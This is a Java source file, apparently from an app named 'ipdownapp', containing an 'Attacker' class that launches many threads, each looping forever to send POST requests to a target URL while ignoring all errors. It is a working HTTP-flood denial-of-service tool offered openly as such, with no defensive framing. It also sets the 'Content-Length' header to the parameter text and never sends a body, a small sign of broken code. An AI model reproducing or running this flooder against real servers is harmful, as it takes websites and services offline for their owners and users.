package com.example.ipdownapp.atack_tools;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class Attacker {

    private int num_threads;

    public Attacker(String url_request, int num_threads) throws Exception {
        this.num_threads = num_threads;
        for (int i = 0; i < num_threads; i++) {
            DdosThread thread = new DdosThread();
            thread.setRequest(url_request);
            thread.start();
        }
    }

    public static class DdosThread extends Thread {

        private AtomicBoolean running = new AtomicBoolean(true);
        private String request;
        private URL url;

        String param = null;

        public DdosThread() throws Exception {
            param = "param1=" + URLEncoder.encode("87845", "UTF-8");
        }

        public void setRequest(String request) {
            this.request = request;
        }

        @Override
        public void run() {
            while (running.get()) {
                try {
                    attack();
                } catch (Exception e) {
                }
            }
        }

        public void attack() throws Exception {
            url = new URL(request);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("charset", "utf-8");
            connection.setRequestProperty("Content-Length", param);
            System.out.println(this + " " + connection.getResponseCode());
            connection.getInputStream();
        }
    }

}
